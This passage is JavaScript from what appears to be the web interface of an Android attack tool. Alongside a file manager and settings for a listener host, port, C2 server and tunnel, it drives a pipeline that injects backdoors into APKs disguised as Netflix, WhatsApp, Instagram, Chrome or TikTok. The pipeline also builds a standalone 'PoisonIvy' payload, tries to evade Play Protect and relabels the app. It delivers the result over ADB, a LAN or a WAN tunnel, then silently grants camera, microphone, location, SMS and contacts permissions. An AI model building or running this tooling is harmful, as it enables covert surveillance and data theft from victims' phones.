      termLine(`\x1b[32m[fm] Recompiled + signed → ${d.out_apk}\x1b[0m`);
      fmHostNav(d.out_apk.substring(0, d.out_apk.lastIndexOf('/')));
    } else {
      termLine(`\x1b[31m[fm] Recompile failed: ${d.error||d.stderr}\x1b[0m`);
    }
  });
}

function fmDelete(path, side) {
  if (!confirm(`Delete ${path}?`)) return;
  fetch('/api/fs/delete', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({path})
  }).then(r => r.json()).then(d => {
    if (d.ok) { termLine(`\x1b[32m[fm] Deleted ${path}\x1b[0m`); fmHostNav(fmHostPath); }
    else      termLine(`\x1b[31m[fm] Delete failed: ${d.error}\x1b[0m`);
  });
}

function fmRename(path, side) {
  const newname = prompt('New name/path:', path);
  if (!newname || newname === path) return;
  fetch('/api/fs/rename', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({src: path, dst: newname})
  }).then(r => r.json()).then(d => {
    if (d.ok) { termLine(`\x1b[32m[fm] Renamed → ${d.path}\x1b[0m`); fmHostNav(fmHostPath); }
    else      termLine(`\x1b[31m[fm] Rename failed: ${d.error}\x1b[0m`);
  });
}

function fmMkdir(side) {
  const base = side === 'host' ? fmHostPath : fmDevPath;
  const name = prompt('New folder name:', 'new_folder');
  if (!name) return;
  const full = base.replace(/\/+$/,'') + '/' + name;
  fetch('/api/fs/mkdir', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({path: full})
  }).then(r => r.json()).then(d => {
    if (d.ok) { fmHostNav(fmHostPath); }
    else      termLine(`\x1b[31m[fm] mkdir failed: ${d.error}\x1b[0m`);
  });
}

function fmUploadClick() {
  document.getElementById('fm-upload-inp')?.click();
}

function fmUploadFile(inp) {
  const file = inp.files[0];
  if (!file) return;
  termLine(`\x1b[36m[fm] Uploading ${file.name} (${_fmFmt(file.size)})…\x1b[0m`);
  const reader = new FileReader();
  reader.onload = e => {
    const buf = e.target.result;
    fetch('/api/fs/upload', {
      method:'POST',
      headers:{'Content-Length': buf.byteLength, 'X-Filename': file.name, 'X-Dest-Dir': fmHostPath},
      body: buf
    }).then(r => r.json()).then(d => {
      if (d.ok) {
        termLine(`\x1b[32m[fm] Uploaded → ${d.path}\x1b[0m`);
        fmHostNav(fmHostPath);
      } else termLine(`\x1b[31m[fm] Upload failed: ${d.error}\x1b[0m`);
    });
  };
  reader.readAsArrayBuffer(file);
  inp.value = '';
}

function fmPullApkDialog() {
  const serial  = document.querySelector('#dev-select')?.value || '';
  const package_ = prompt('Package name to pull (e.g. com.example.app):');
  if (!package_) return;
  termLine(`\x1b[36m[fm] Pulling APK for ${package_}…\x1b[0m`);
  fetch('/api/device/apk/pull', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({serial, package: package_})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      termLine(`\x1b[32m[fm] APK pulled → ${d.local}\x1b[0m`);
      fmHostNav(d.local.substring(0, d.local.lastIndexOf('/')));
    } else termLine(`\x1b[31m[fm] Pull failed: ${d.error||d.output}\x1b[0m`);
  });
}

function fmPullFileEntry(entry) {
  const serial = document.querySelector('#dev-select')?.value || '';
  termLine(`\x1b[36m[fm] Pulling ${entry.path}…\x1b[0m`);
  fetch('/api/device/fs/pull', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({serial, remote: entry.path})
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      termLine(`\x1b[32m[fm] Pulled → ${d.local}\x1b[0m`);
      fmHostNav(d.local.substring(0, d.local.lastIndexOf('/')));
    } else termLine(`\x1b[31m[fm] Pull failed: ${d.output}\x1b[0m`);
  });
}

function fmPullFile() { if (fmDevSel) fmPullFileEntry(fmDevSel); }
function fmPullApk()  { if (fmDevSel) fmPullFileEntry(fmDevSel); }
function fmPullDir()  { if (fmDevSel) fmPullFileEntry(fmDevSel); }

function fmPushToDevice() {
  if (!fmHostSel) { alert('Select a file on the host first'); return; }
  const serial = document.querySelector('#dev-select')?.value || '';
  const remote = fmDevPath.replace(/\/+$/,'') + '/' + fmHostSel.name;
  if (!confirm(`Push ${fmHostSel.path} → device:${remote}?`)) return;
  termLine(`\x1b[36m[fm] Pushing ${fmHostSel.path} → device:${remote}…\x1b[0m`);
  fetch('/api/device/fs/push', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({serial, local: fmHostSel.path, remote})
  }).then(r => r.json()).then(d => {
    if (d.ok) termLine(`\x1b[32m[fm] Pushed OK\x1b[0m`);
    else      termLine(`\x1b[31m[fm] Push failed: ${d.output}\x1b[0m`);
    fmDevNav(fmDevPath);
  });
}

function fmPushToPath(remotePath) {
  if (!fmHostSel) { alert('Select a host file first'); return; }
  const serial = document.querySelector('#dev-select')?.value || '';
  termLine(`\x1b[36m[fm] Pushing ${fmHostSel.path} → device:${remotePath}…\x1b[0m`);
  fetch('/api/device/fs/push', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({serial, local: fmHostSel.path, remote: remotePath})
  }).then(r => r.json()).then(d => {
    if (d.ok) termLine(`\x1b[32m[fm] Pushed OK\x1b[0m`);
    else      termLine(`\x1b[31m[fm] Push failed: ${d.output}\x1b[0m`);
    fmDevNav(fmDevPath);
  });
}

function fmPullAndDecompile(entry) {
  const serial = document.querySelector('#dev-select')?.value || '';
  termLine(`\x1b[36m[fm] Pulling + decompiling ${entry.path}…\x1b[0m`);
  fetch('/api/device/fs/pull', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({serial, remote: entry.path})
  }).then(r => r.json()).then(d => {
    if (!d.ok) { termLine(`\x1b[31m[fm] Pull failed: ${d.output}\x1b[0m`); return; }
    termLine(`\x1b[32m[fm] Pulled → ${d.local}\x1b[0m`);
    fmDecompile(d.local);
  });
}

// init host path from server home dir
fetch('/api/workdir').then(r => r.json()).then(d => {
  if (d.base) {
    window._fmHomePath = d.base;
    const inp = document.getElementById('fm-host-path-inp');
    if (inp && !inp.value) inp.value = d.base;
  }
});

// ── Setup/Deps ────────────────────────────────────────────────────────────────
function loadSettings() {
  fetch('/api/settings').then(r => r.json()).then(d => {
    settings = d.settings || settings;
    document.getElementById('s-lhost').value   = settings.lhost||'';
    document.getElementById('s-lport').value   = settings.lport||'4444';
    document.getElementById('s-bore').value    = settings.bore_server||'bore.pub';
    document.getElementById('s-nvd').value     = settings.nvd_api_key||'';
    document.getElementById('s-c2host').value  = settings.c2_host||'';
    document.getElementById('s-c2port').value  = settings.c2_port||'8889';
    // sync into P&D fields
    const lhEl = document.getElementById('pd-lhost');
    const lpEl = document.getElementById('pd-lport');
    if (lhEl && settings.lhost) lhEl.value = settings.lhost;
    if (lpEl && settings.lport) lpEl.value = settings.lport;
  });
}

function saveSettings() {
  settings.lhost      = document.getElementById('s-lhost').value.trim();
  settings.lport      = document.getElementById('s-lport').value.trim();
  settings.bore_server = document.getElementById('s-bore').value.trim();
  settings.nvd_api_key = document.getElementById('s-nvd').value.trim();
  settings.c2_host    = document.getElementById('s-c2host').value.trim();
  settings.c2_port    = document.getElementById('s-c2port').value.trim();
  fetch('/api/settings', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(settings)
  }).then(() => {
    updateLhostDisplay();
    termLine(`\x1b[32m[+] Settings saved — LHOST=${settings.lhost||'auto'}, LPORT=${settings.lport}\x1b[0m`);
  });
}

function detectLhost() {
  fetch('/api/lhost').then(r => r.json()).then(d => {
    if (d.lhost && !settings.lhost) {
      settings.lhost = d.lhost;
      document.getElementById('s-lhost').value = d.lhost;
    }
    updateLhostDisplay();
  });
}

function updateLhostDisplay() {
  const el = document.getElementById('lhost-display');
  el.textContent = settings.lhost ? `lhost: ${settings.lhost}` : '';
}

function loadDeps() {
  const grid  = document.getElementById('dep-grid');
  const badge = document.getElementById('dep-pkgmgr');
  grid.innerHTML = '<div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;letter-spacing:0.08em;">scanning…</div>';
  fetch('/api/deps').then(r => r.json()).then(d => {
    if (badge && d.pkg_mgr) {
      badge.textContent = d.pkg_mgr;
      badge.style.display = 'inline';
    }
    grid.innerHTML = '';
    const missing = [], present = [];
    for (const [name, info] of Object.entries(d.deps || {})) {
      (info.ok ? present : missing).push([name, info]);
    }
    const render = (list) => {
      for (const [name, info] of list) {
        const card = document.createElement('div'); card.className = 'dep-card';
        card.innerHTML = `
          <div class="dep-dot ${info.ok?'ok':'miss'}"></div>
          <div style="flex:1;overflow:hidden;">
            <div class="dep-name">${name}</div>
            ${!info.ok ? `<div class="dep-install" title="${info.install}">${info.install}</div>` : ''}
          </div>
          <span style="font-size:0.62rem;${info.ok?'color:var(--green)':'color:var(--red)'}">${info.ok?'✓':'✗'}</span>`;
        grid.appendChild(card);
      }
    };
    render(missing);
    if (missing.length && present.length) {
      const sep = document.createElement('div');
      sep.style.cssText = 'grid-column:1/-1;background:var(--border2);height:1px;margin:2px 0;';
      grid.appendChild(sep);
    }
    render(present);
    if (!missing.length) {
      const ok = document.createElement('div');
      ok.style.cssText = 'grid-column:1/-1;padding:8px 14px;font-size:0.65rem;color:var(--green);letter-spacing:0.06em;';
      ok.textContent = '✓ all dependencies satisfied';
      grid.prepend(ok);
    }
  });
}

// ════════════════════════════════════════════════════════════════════════════
// PAYLOAD & DELIVERY PANEL
// ════════════════════════════════════════════════════════════════════════════
let _pdSrcMode = 'local';      // 'local' | 'template' | 'device' | 'standalone'
let _pdMthSel  = 'none';       // 'none' | 'adb' | 'lan' | 'wan'
let _pdBuiltApk = '';          // path of last built/selected APK
let _pdWanActive = false;
let _pdLanActive = false;

// ── pdFormUpd: sync radio state → conditionals + button label ────────────────
const _PM_TEMPLATES = {
  netflix:'~/.secv/templates/netflix.apk', whatsapp:'~/.secv/templates/whatsapp.apk',
  instagram:'~/.secv/templates/instagram.apk', chrome:'~/.secv/templates/chrome.apk',
  tiktok:'~/.secv/templates/tiktok.apk'
};

function pdFormUpd() {
  const srcEl = document.querySelector('input[name="pd-src"]:checked');
  const src   = srcEl ? srcEl.value : 'local';
  // update chip highlights
  document.querySelectorAll('#pm-src-chips .pm-chip').forEach(c =>
    c.classList.toggle('sel', c.querySelector('input').value === src));
  // set internal mode
  _pdSrcMode = _PM_TEMPLATES[src] ? 'template' : src;
  // auto-fill path for templates
  if (_PM_TEMPLATES[src]) {
    const apk = document.getElementById('pd-apk-path');
    if (apk) { apk.value = _PM_TEMPLATES[src]; pdCheckApkStatus(); }
  }
  // source sub-sections
  const isPath = src === 'local' || !!_PM_TEMPLATES[src];
  const pathSub = document.getElementById('pm-sub-path');
  const devSub  = document.getElementById('pm-sub-device');
  const stSub   = document.getElementById('pm-sub-standalone');
  if (pathSub) pathSub.classList.toggle('show', isPath);
  if (devSub)  devSub.classList.toggle('show',  src === 'device');
  if (stSub)   stSub.classList.toggle('show',   src === 'standalone');

  const dlvEl = document.querySelector('input[name="pd-dlv"]:checked');
  const dlv   = dlvEl ? dlvEl.value : 'none';
  _pdMthSel   = dlv;
  // update delivery chip highlights
  document.querySelectorAll('#pm-dlv-chips .pm-chip').forEach(c =>
    c.classList.toggle('sel', c.querySelector('input').value === dlv));
  // delivery sub-sections
  ['adb-net','lan','wan'].forEach(m => {
    const el = document.getElementById('pm-sub-' + m);
    if (el) el.classList.toggle('show', m === dlv);
  });

  // update button label
  const btn = document.getElementById('pd-action-btn');
  if (!btn) return;
  const isStand = _pdSrcMode === 'standalone';
  const lblMap = {
    'none':    isStand ? '▶ GENERATE PAYLOAD'                  : '▶ BUILD &amp; INJECT',
    'adb-usb': isStand ? '▶ GENERATE &amp; INSTALL (USB)'      : '▶ BUILD, INJECT &amp; INSTALL (USB)',
    'adb-net': isStand ? '▶ GENERATE &amp; INSTALL (WIRELESS)' : '▶ BUILD, INJECT &amp; INSTALL (WIRELESS)',
    'lan':     isStand ? '▶ GENERATE &amp; SERVE LAN'          : '▶ BUILD, INJECT &amp; SERVE LAN',
    'wan':     isStand ? '▶ GENERATE &amp; EXPOSE WAN'         : '▶ BUILD, INJECT &amp; EXPOSE WAN',
  };
  btn.innerHTML = lblMap[dlv] || lblMap['none'];
}

function pdTplChange() { pdFormUpd(); }

// ── pdAction: unified build + optional delivery ───────────────────────────────
function pdAction() {
  const srcEl = document.querySelector('input[name="pd-src"]:checked');
  const src   = srcEl ? srcEl.value : 'local';
  const dlvEl = document.querySelector('input[name="pd-dlv"]:checked');
  const dlv   = dlvEl ? dlvEl.value : 'none';
  _pdSrcMode  = _PM_TEMPLATES[src] ? 'template' : src;
  _pdMthSel   = dlv;

  const lhost   = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
  const lport   = document.getElementById('pd-lport').value.trim() || '4444';
  const payload = document.getElementById('pd-payload').value;
  const togPP   = document.getElementById('pd-tog-pp').checked;
  const togID   = document.getElementById('pd-tog-id').checked;
  const logEl   = document.getElementById('pd-build-log');

  if (!lhost) { showToast('Set LHOST first', 'disconnect', 3000); return; }

  logEl.style.display = 'block';
  logEl.textContent   = '';
  const pdLog = txt => { logEl.textContent += txt + '\n'; logEl.scrollTop = logEl.scrollHeight; };

  let params = { lhost, lport, payload };
  let ops    = [];

  if (src === 'standalone') {
    ops.push({ op:'backdoor_apk', params: { ...params, standalone: true, apk_path: '',
      output_name: document.getElementById('pd-standalone-name').value || 'payload.apk' }});
  } else {
    const apkPath = document.getElementById('pd-apk-path').value.trim();
    if (!apkPath) { showToast('Select an APK source or fill in a path', 'disconnect', 2500); return; }
    params.apk_path = apkPath;
    ops.push({ op:'backdoor_apk', params });
  }

  if (togPP) ops.push({ op:'bypass_play_protect', params });
  if (togID) ops.push({ op:'customize_apk', params: { ...params,
    icon_path:    document.getElementById('pd-icon').value.trim(),
    app_label:    document.getElementById('pd-app-label').value.trim(),
    package_name: document.getElementById('pd-pkg-name').value.trim(),
  }});

  pdLog('Starting: ' + ops.map(o => o.op).join(' → ') + (dlv !== 'none' ? ' → ' + dlv : '') + '\n');

  function runNext(idx) {
    if (idx >= ops.length) {
      pdLog('\n✓ Build complete.');
      pdCheckApkStatus();
      if (dlv === 'none')    { showToast('Build done', 'connect', 3000); return; }
      if (dlv === 'adb-usb') { pdLog('\n→ ADB install (USB)…');       pdAdbInstall();    return; }
      if (dlv === 'adb-net') {
        if (!document.getElementById('pd-adb-ip').value.trim()) {
          showToast('Enter device IP in Delivery section', 'disconnect', 2500); return;
        }
        pdLog('\n→ ADB install (network)…'); pdAdbNetInstall(); return;
      }
      if (dlv === 'lan')  { pdLog('\n→ Starting LAN server…'); pdRunOp('lan_serve'); return; }
      if (dlv === 'wan')  { pdLog('\n→ Starting WAN tunnel…'); pdWanExpose();        return; }
      return;
    }
    const { op, params: p } = ops[idx];
    const serial = document.getElementById('dev-select').value;
    pdLog('→ Running: ' + op);
    fetch('/api/run', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ target: serial, params: { operation: op, ...p }})
    }).then(r => r.json()).then(d => {
      if (d.session_id) {
        if (src === 'standalone' && idx === 0) {
          _pdBuiltApk = '/tmp/' + (document.getElementById('pd-standalone-name').value || 'payload.apk');
          document.getElementById('pd-apk-path').value = _pdBuiltApk;
        }
        pdLog('  Session #' + d.session_id + ' started');
        watchSession(d.session_id, () => runNext(idx + 1), pdLog);
      } else {
        pdLog('  Error: ' + (d.error||JSON.stringify(d)));
      }
    }).catch(e => pdLog('  Fetch error: ' + e));
  }
  runNext(0);
}

// ── pdNav: unified panel — scroll to section, refresh if needed ──────────────
function pdNav(view) {
  // unified layout — all sections are always visible, just scroll to them
  const anchor = view === 'sessions' ? 'pdv-secv-list'
               : view === 'deliver'  ? 'pd-apk-status-card'
               : view === 'qr'       ? 'pdv-qr-area'
               : 'pd-action-btn';
  const el = document.getElementById(anchor);
  if (el) el.scrollIntoView({behavior:'smooth', block:'start'});
  if (view === 'sessions') { pdRefreshSessions(); pdRefreshMsfSessions(); }
  if (view === 'deliver')  { pdCheckApkStatus(); }
  if (view === 'qr')       { pdRefreshQRView(); }
}

// ── source selector ───────────────────────────────────────────────────────────
function pdSrc(mode) {
  _pdSrcMode = mode;
  document.querySelectorAll('.pd-src-tab').forEach(b => b.classList.toggle('active', b.textContent.toLowerCase().includes(mode === 'standalone' ? 'poison' : mode)));
  ['local','device','standalone'].forEach(m => {
    const el = document.getElementById('pd-src-' + m);
    if (el) { el.classList.toggle('show', m === mode); }
  });
}

// ── auto-fill APK path — scan android/ then templates/ ───────────────────────
function pdAutoFillApk() {
  const dirs = ['~/.secv/android', '~/.secv/templates'];
  let allApks = [];
  let done = 0;
  dirs.forEach(dir => {
    fetch('/api/fs/list?path=' + encodeURIComponent(dir))
      .then(r => r.json()).then(d => {
        (d.entries || []).forEach(e => {
          if (e.ext === '.apk') allApks.push({path: e.path, mtime: e.mtime || 0});
        });
      }).catch(() => {}).finally(() => {
        done++;
        if (done === dirs.length) {
          allApks.sort((a, b) => b.mtime - a.mtime);
          if (allApks.length) {
            const best = allApks[0];
            document.getElementById('pd-apk-path').value = best.path;
            _pdBuiltApk = best.path;
            showToast('Auto-filled: ' + best.path.split('/').pop(), 'info', 2500);
          } else {
            showToast('No APKs found — use browse or build one first', 'disconnect', 3000);
          }
        }
      });
  });
}

// ── server-side APK file browser ─────────────────────────────────────────────
let _apkBrowserCurPath = '';
let _apkBrowserAllEntries = [];

function pdBrowseClick() {
  _apkBrowserCurPath = '~/.secv';
  document.getElementById('apk-browser-filter').value = '';
  document.getElementById('apk-browser-overlay').classList.add('show');
  apkBrowserLoad('~/.secv');
}

function apkBrowserClose() {
  document.getElementById('apk-browser-overlay').classList.remove('show');
}
function apkBrowserBgClick(e) {
  if (e.target === document.getElementById('apk-browser-overlay')) apkBrowserClose();
}

function apkBrowserLoad(path) {
  _apkBrowserCurPath = path;
  const listEl   = document.getElementById('apk-browser-list');
  const loadEl   = document.getElementById('apk-browser-loading');
  const emptyEl  = document.getElementById('apk-browser-empty');
  const pathEl   = document.getElementById('apk-browser-path');
  loadEl.style.display = 'block';
  emptyEl.style.display = 'none';
  pathEl.textContent = path;
  listEl.querySelectorAll('.apk-entry').forEach(e => e.remove());
  fetch('/api/fs/list?path=' + encodeURIComponent(path))
    .then(r => r.json()).then(d => {
      loadEl.style.display = 'none';
      if (d.error) { emptyEl.textContent = d.error; emptyEl.style.display = 'block'; return; }
      _apkBrowserCurPath = d.path || path;
      pathEl.textContent = _apkBrowserCurPath;
      _apkBrowserAllEntries = d.entries || [];
      document.getElementById('apk-browser-filter').value = '';
      apkBrowserRender(_apkBrowserAllEntries);
    }).catch(err => {
      loadEl.style.display = 'none';
      emptyEl.textContent = 'Error: ' + err;
      emptyEl.style.display = 'block';
    });
}

function apkBrowserRender(entries) {
  const listEl  = document.getElementById('apk-browser-list');
  const emptyEl = document.getElementById('apk-browser-empty');
  listEl.querySelectorAll('.apk-entry').forEach(e => e.remove());
  if (!entries.length) { emptyEl.style.display = 'block'; return; }
  emptyEl.style.display = 'none';
  const frag = document.createDocumentFragment();
  entries.forEach(e => {
    const isDir = e.type === 'dir';
    const isApk = !isDir && e.ext === '.apk';
    const div = document.createElement('div');
    div.className = 'apk-entry ' + (isDir ? 'is-dir' : isApk ? 'is-apk' : 'is-other');
    div.innerHTML =
      `<span class="ae-icon">${isDir ? '▸' : isApk ? '◆' : '·'}</span>` +
      `<span class="ae-name">${e.name}</span>` +
      (isApk ? `<span class="ae-size">${fmtBytes(e.size)}</span>` : '');
    if (isDir) {
      div.onclick = () => { document.getElementById('apk-browser-filter').value = ''; apkBrowserLoad(e.path); };
    } else if (isApk) {
      div.onclick = () => { apkBrowserPick(e.path); };
    }
    frag.appendChild(div);
  });
  listEl.appendChild(frag);
}

function apkBrowserFilter() {
  const q = document.getElementById('apk-browser-filter').value.toLowerCase();
  const filtered = _apkBrowserAllEntries.filter(e => e.name.toLowerCase().includes(q));
  apkBrowserRender(filtered);
}

function apkBrowserUp() {
  if (!_apkBrowserCurPath) return;
  const parts = _apkBrowserCurPath.replace(/\/+$/, '').split('/');
  if (parts.length <= 1) return;
  parts.pop();
  apkBrowserLoad(parts.join('/') || '/');
}

function apkBrowserPick(path) {
  document.getElementById('pd-apk-path').value = path;
  _pdBuiltApk = path;
  pdCheckApkStatus();
  apkBrowserClose();
  showToast('Selected: ' + path.split('/').pop(), 'info', 2000);
}

function fmtBytes(b) {
  if (!b) return '';
  if (b < 1024) return b + ' B';
  if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
  return (b/1048576).toFixed(1) + ' MB';
}

// ── pull APK from device ──────────────────────────────────────────────────────
function pdPullApk() {
  const pkg = document.getElementById('pd-pkg-pull').value.trim();
  if (!pkg) { showToast('Enter a package name', 'disconnect', 2000); return; }
  const serial = document.getElementById('dev-select').value;
  showToast('Pulling APK for ' + pkg + '…', 'info', 2000);
  fetch('/api/adb', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({args: (serial ? ['-s',serial] : []).concat(['shell','pm','path',pkg])})
  }).then(r => r.json()).then(d => {
    const match = (d.output||'').match(/package:(.+)/);
    if (!match) { showToast('Package not found on device', 'disconnect', 3000); return; }
    const devPath = match[1].trim();
    const outName = pkg + '.apk';
    return fetch('/api/adb', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({args: (serial ? ['-s',serial] : []).concat(['pull', devPath, '/tmp/' + outName])})
    }).then(r => r.json()).then(d2 => {
      _pdBuiltApk = '/tmp/' + outName;
      document.getElementById('pd-apk-path').value = _pdBuiltApk;
      showToast('Pulled to /tmp/' + outName, 'connect', 3000);
      pdNav('deliver');
    });
  }).catch(e => showToast('ADB pull error: ' + e, 'disconnect', 4000));
}

// ── evasion toggle ────────────────────────────────────────────────────────────
function pdToggle() {
  const showId = document.getElementById('pd-tog-id').checked;
  document.getElementById('pd-id-fields').style.display = showId ? 'flex' : 'none';
}

// ── build & inject ────────────────────────────────────────────────────────────
function pdBuild() {
  const lhost   = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
  const lport   = document.getElementById('pd-lport').value.trim() || '4444';
  const payload = document.getElementById('pd-payload').value;
  const togPP   = document.getElementById('pd-tog-pp').checked;
  const togID   = document.getElementById('pd-tog-id').checked;
  const logEl   = document.getElementById('pd-build-log');

  if (!lhost) { showToast('Set LHOST first (Setup tab or field above)', 'disconnect', 3000); return; }

  logEl.style.display = 'block';
  logEl.textContent   = '';

  const pdLog = txt => { logEl.textContent += txt + '\n'; logEl.scrollTop = logEl.scrollHeight; };

  let params = { lhost, lport, payload };
  let ops = [];

  if (_pdSrcMode === 'standalone') {
    ops.push({ op:'backdoor_apk', params: {...params, standalone: true, apk_path: '',
      output_name: document.getElementById('pd-standalone-name').value || 'payload.apk' }});
  } else {
    const apkPath = document.getElementById('pd-apk-path').value.trim();
    if (!apkPath) { showToast('Specify APK path (or use auto-fill)', 'disconnect', 2500); return; }
    params.apk_path = apkPath;
    ops.push({ op:'backdoor_apk', params });
  }

  if (togPP)  ops.push({ op:'bypass_play_protect', params });
  if (togID)  ops.push({ op:'customize_apk', params: {
    ...params,
    icon_path:    document.getElementById('pd-icon').value.trim(),
    app_label:    document.getElementById('pd-app-label').value.trim(),
    package_name: document.getElementById('pd-pkg-name').value.trim(),
  }});

  pdLog('Starting build chain: ' + ops.map(o => o.op).join(' → ') + '\n');

  function runNext(idx) {
    if (idx >= ops.length) {
      pdLog('\n✓ Build chain complete.');
      showToast('Build done — switch to Deliver tab', 'connect', 3000);
      const badge = document.getElementById('pd-badge');
      if (badge) { badge.textContent = '●'; badge.style.display = 'inline'; }
      pdCheckApkStatus();
      return;
    }
    const { op, params: p } = ops[idx];
    const serial = document.getElementById('dev-select').value;
    pdLog('→ Running: ' + op);
    fetch('/api/run', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ target: serial, params: { operation: op, ...p }})
    }).then(r => r.json()).then(d => {
      if (d.session_id) {
        pdLog('  Session #' + d.session_id + ' started');
        watchSession(d.session_id, () => runNext(idx + 1), pdLog);
      } else {
        pdLog('  Error: ' + (d.error||JSON.stringify(d)));
      }
    }).catch(e => pdLog('  Fetch error: ' + e));
  }
  runNext(0);
}

// ── standalone PoisonIvy payload ─────────────────────────────────────────────
function pdBuildStandalone() {
  const lhost = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
  const lport = document.getElementById('pd-lport').value.trim() || '4444';
  const name  = document.getElementById('pd-standalone-name')?.value || 'payload.apk';
  if (!lhost) { showToast('Set LHOST first', 'disconnect', 2500); return; }
  const logEl = document.getElementById('pd-build-log');
  logEl.style.display = 'block';
  logEl.textContent = 'Generating standalone payload: ' + name + '\n';
  const pdLog = t => { logEl.textContent += t + '\n'; logEl.scrollTop = logEl.scrollHeight; };
  fetch('/api/run', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ target: '', params: {
      operation:'backdoor_apk', lhost, lport, standalone: true, apk_path:'', output_name: name
    }})
  }).then(r => r.json()).then(d => {
    if (d.session_id) {
      pdLog('Session #' + d.session_id + ' — generating…');
      watchSession(d.session_id, () => {
        _pdBuiltApk = '/tmp/' + name;
        document.getElementById('pd-apk-path').value = _pdBuiltApk;
        pdCheckApkStatus();
        showToast('Standalone payload ready: ' + name, 'connect', 3000);
        pdLog('✓ Done → ' + _pdBuiltApk);
      }, pdLog);
    } else {
      pdLog('Error: ' + (d.error||JSON.stringify(d)));
    }
  }).catch(e => pdLog('Fetch error: ' + e));
}

function watchSession(sid, onDone, logFn) {
  const poll = () => {
    fetch('/api/sessions').then(r => r.json()).then(d => {
      const s = (d.sessions || []).find(x => x.id === sid);
      if (!s || s.status === 'running') { setTimeout(poll, 800); return; }
      logFn('  Session #' + sid + ' → ' + s.status);
      onDone();
    }).catch(() => setTimeout(poll, 1500));
  };
  setTimeout(poll, 800);
}

// ── check APK status ─────────────────────────────────────────────────────────
function pdCheckApkStatus() {
  const apkPath = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
  const msgEl   = document.getElementById('pd-apk-ready-msg');
  const rowEl   = document.getElementById('pd-deliver-apk-row');
  const pathEl  = document.getElementById('pd-deliver-apk-path');
  const badge   = document.getElementById('pd-apk-badge');
  if (!msgEl) return;
  if (apkPath) {
    msgEl.style.display = 'none';
    if (rowEl)  { rowEl.style.display = 'block'; }
    if (pathEl) pathEl.textContent = apkPath;
    if (badge)  { badge.textContent = '● ready'; badge.className = 'pd-status-badge ready'; badge.style.display = ''; }
  } else {
    msgEl.style.display = '';
    if (rowEl)  rowEl.style.display = 'none';
    if (badge)  badge.style.display = 'none';
  }
}

// ── delivery method selector ──────────────────────────────────────────────────
function pdMth(mth) {
  _pdMthSel = mth;
  ['adb-usb','adb-net','lan','wan'].forEach(m => {
    const card = document.getElementById('pdm-' + m);
    const fields = document.getElementById('pdmf-' + m);
    if (card)   card.classList.toggle('sel', m === mth);
    if (fields) fields.classList.toggle('show', m === mth);
  });
}

// ── ADB USB install ───────────────────────────────────────────────────────────
function pdAdbInstall() {
  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
  if (!apk) { showToast('No APK selected — build first or fill path', 'disconnect', 2500); return; }
  const serial = document.getElementById('dev-select').value;
  const args = (serial ? ['-s',serial] : []).concat(['install','-r',apk]);
  showToast('Installing…', 'info', 1500);
  fetch('/api/adb', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({args})
  }).then(r => r.json()).then(d => {
    const ok = (d.output||'').includes('Success');
    showToast(ok ? 'Installed successfully' : 'Install result: ' + d.output.slice(0,80), ok?'connect':'disconnect', 4000);
    pdDeliverLog((ok ? '✓ ' : '✗ ') + (d.output||d.error||''));
  });
}
function pdAdbGrant() {
  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
  const serial = document.getElementById('dev-select').value;
  if (!apk) { showToast('Install APK first', 'disconnect', 2000); return; }
  const perms = ['android.permission.READ_EXTERNAL_STORAGE','android.permission.RECORD_AUDIO',
    'android.permission.CAMERA','android.permission.ACCESS_FINE_LOCATION',
    'android.permission.READ_CONTACTS','android.permission.READ_SMS'];
  const pkg = document.getElementById('pd-pkg-name')?.value?.trim() || 'com.netflix.mediastream';
  let cmds = perms.map(p => (serial?['-s',serial]:[]).concat(['shell','pm','grant',pkg,p]));
  let i = 0;
  const runOne = () => {
    if (i >= cmds.length) { showToast('Permissions granted', 'connect', 2000); return; }
    fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({args:cmds[i++]})}).then(() => runOne());
  };
  runOne();
}
function pdAdbLaunch() {
  const pkg = document.getElementById('pd-pkg-name')?.value?.trim() || 'com.netflix.mediastream';
  const serial = document.getElementById('dev-select').value;
  fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({args:(serial?['-s',serial]:[]).concat([
      'shell','monkey','-p',pkg,'-c','android.intent.category.LAUNCHER','1'])})
  }).then(r=>r.json()).then(d => showToast('Launched: ' + pkg, 'info', 2000));
}

// ── ADB Network ───────────────────────────────────────────────────────────────
function pdAdbConnect() {
  const ip = document.getElementById('pd-adb-ip').value.trim();
  if (!ip) { showToast('Enter device IP:port', 'disconnect', 2000); return; }
  fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({args:['connect', ip]})
  }).then(r=>r.json()).then(d => {
    showToast(d.output||d.error||'', (d.output||'').includes('connect') ? 'connect':'disconnect', 3000);
    pdDeliverLog(d.output||d.error||'');
  });
}
function pdAdbNetInstall() {
  const ip  = document.getElementById('pd-adb-ip').value.trim();
